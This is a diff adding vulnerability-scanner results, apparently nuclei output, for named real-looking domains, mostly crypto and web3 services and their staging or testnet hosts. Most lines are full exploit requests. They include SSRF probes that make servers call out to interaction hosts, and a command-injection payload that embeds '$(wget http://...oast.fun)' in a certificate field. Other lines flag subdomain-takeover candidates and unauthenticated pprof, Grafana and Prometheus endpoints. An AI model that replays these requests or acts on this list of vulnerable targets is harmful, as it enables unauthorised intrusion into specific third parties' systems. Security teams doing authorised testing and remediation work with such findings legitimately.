@@ -1,0 +1,31 @@
+[CNVD-2023-96945] [http] [high] https://meta.elfi.xyz/Content/Plugins/uploader/FileChoose.html
+[CVE-2015-8813] [http] [high] https://ddocs-indexer.fileverse.io/Umbraco/feedproxy.aspx?url=http://d94457tulefjdnsorvogwoz8n1brsz968.oast.fun
+[CVE-2015-8813] [http] [high] https://identity-v1.fileverse.io/Umbraco/feedproxy.aspx?url=http://d9446ltulefjee89v1o0jhbsp7zwq8swb.oast.live
+[CVE-2017-0929] [http] [high] https://ddocs-indexer.fileverse.io/DnnImageHandler.ashx?mode=file&url=http://d94457tulefjdnsorvogesiszf648otht.oast.fun
+[CVE-2017-0929] [http] [high] https://identity-v1.fileverse.io/DnnImageHandler.ashx?mode=file&url=http://d9446ltulefjee89v1o0fsccow8689hty.oast.live
+[CVE-2017-18638] [http] [high] https://ddocs-indexer.fileverse.io/composer/send_email?to=BDqI@Vxwf&url=http://d94457tulefjdnsorvogaxg6st4t44fes.oast.fun
+[CVE-2017-18638] [http] [high] https://identity-v1.fileverse.io/composer/send_email?to=JlFM@vrwW&url=http://d9446ltulefjee89v1o0g5d56m87ha1ho.oast.live
+[CVE-2018-1000600] [http] [high] https://ddocs-indexer.fileverse.io/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://d94457tulefjdnsorvoghj3st7mcrebk7.oast.fun
+[CVE-2018-1000600] [http] [high] https://identity-v1.fileverse.io/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://d9446ltulefjee89v1o07ezyhfcfd1g7q.oast.live
+[CVE-2019-11248] [http] [high] https://quote.omni.apex.exchange/debug/pprof/
+[CVE-2019-11248] [http] [high] https://remote-write.switchboard.xyz/debug/pprof/
+[CVE-2021-33544] [http] [high] https://ddocs-indexer.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d94457tulefjdnsorvogawkouf1bq8511.oast.fun)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2021-33544] [http] [high] https://identity-v1.fileverse.io//uapi-cgi/certmngr.cgi?action=createselfcert&local=anything&country=AA&state=%24(wget%20http://d9446ltulefjee89v1o05p9o3yn5bt7xb.oast.live)&organization=anything&organizationunit=anything&commonname=anything&days=1&type=anything
+[CVE-2024-34351] [http] [high] https://sandbox.spherepay.co/_next/image?w=16&q=10&url=https://d948e0dulefjdcs9vrug98yuqijixwaat.oast.fun
+[CVE-2024-34351] [http] [high] https://spherepay.co/_next/image?w=16&q=10&url=https://d948er5ulefjeq19ov0gqgn6f43y4sjr3.oast.online
+[CVE-2024-34351] [http] [high] https://www.spherepay.co/_next/image?w=16&q=10&url=https://d94cls5ulefjel4bbgsgtzwbg86dz4u63.oast.fun
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana-cp.rpcfast.com/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-4123:open-redirect] [http] [high] https://grafana.switchboard.xyz/public/..%2F%5coast.pro%2F%3f%2F..%2F..
+[CVE-2025-55184] [http] [high] https://demo.orderly.network/en/perp/PERP_ETH_USDC
+[CVE-2025-55184] [http] [high] https://dmm.orderly.network/en/perp/PERP_ETH_USDC
+[CVE-2025-55184] [http] [high] https://mini.avantisfi.com/home
+[CVE-2025-55184] [http] [high] https://testnet-dmm.orderly.network/en/perp/PERP_ETH_USDC
+[clockwork-php-page] [http] [high] https://app.clockwork.xyz/__clockwork/app
+[framer-takeover] [http] [high] https://bootcamp.meteora.ag
+[framer-takeover] [http] [high] https://www.ufo.fm ["sites.framer.app"]
+[github-takeover] [http] [high] https://github-test.orderly.network ["orderlynetwork.github.io"]
+[github-takeover] [http] [high] https://staging-dex.orderly.network ["orderlynetwork.github.io"]
+[github-takeover] [http] [high] https://testnet-dex.orderly.network ["orderlynetworkdexcreatorstaging.github.io"]
+[grafana-unauth-access:dashboard-search-exposed] [http] [high] https://analytics.zeta.markets/api/search?type=dash-db
+[prometheus-unauth] [http] [high] https://remote-write.switchboard.xyz/api/v1/status/config
+[prometheus-unauth] [http] [high] https://remote-write.switchboard.xyz/config
